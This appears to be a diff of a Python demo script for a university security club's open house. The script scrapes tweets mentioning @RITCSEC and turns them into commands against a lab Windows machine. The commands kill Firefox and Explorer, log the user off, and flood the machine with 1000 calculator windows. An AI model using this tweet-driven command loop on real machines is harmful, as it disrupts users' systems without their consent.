@@ -17,18 +17,39 @@ class WindowsCmds():
         import subprocess
 
     def killFirefox(self):
-        os.system('taskkill /f /im exampleProcess.exe')
+        '''
+            Params: None
+            Purpose: Kill Firefox.
+        '''
+        os.system('taskkill /f /im firefox.exe')
 
     def killExplorer(self):
+        '''
+            Params: None
+            Purpose: Kill explorer.exe 
+        '''
         os.system('taskkill /f /im explorer.exe')
 
     def logOff(self):
+        '''
+            Params: None
+            Purpose: Logoff user
+        '''
         os.system('shutdown /l')
 
     def magnify(self):
+        '''
+            Params: None
+            Purpose: Spawn magnify
+        '''
         os.system('magnify.exe')
 
     def calcMe(self):
+        '''
+            Params: None
+            Purpose: Death by calc. Bo would approve.
+
+        '''
         x = 0
         while x < 1000:
             subprocess.Popen(['calc.exe'])
@@ -85,7 +106,7 @@ class TweetScrape():
                     Machine: Lab machine to attack.
             Return: Nothing
         '''
-        winexe = WindowsCmds
+        winexe = WindowsCmds # Windows class object creation.
 
         try:
             if command == "MidtermMadness": 
@@ -118,7 +139,7 @@ class TweetScrape():
         action = dottedTweet.split(".")[2]
         print("Action: " + str(action) + " applied to machine " + str(machine))
 
-        #windows_cmdExection(action, machine)
+        #windows_cmdExection(action, machine) # Commented out for debugging purposes.
 
 
 if __name__ == "__main__":
@@ -128,7 +149,7 @@ if __name__ == "__main__":
 
     while 1: 
 
-        twitter_content = twitter.get_Tweets("https://twitter.com/search?f=tweets&vertical=default&q=%40RITCSEC&src=typd") # Twitter scraping
+        twitter_content = twitter.get_Tweets("https://twitter.com/search?f=tweets&vertical=default&q=%40RITCSEC&src=typd") # Twitter scraping of RITCSECOpenhouse Page.
         command_tweet = twitter.obtain_commands(twitter_content)
         twitter.split_tweet(command_tweet)
         time.sleep(25)
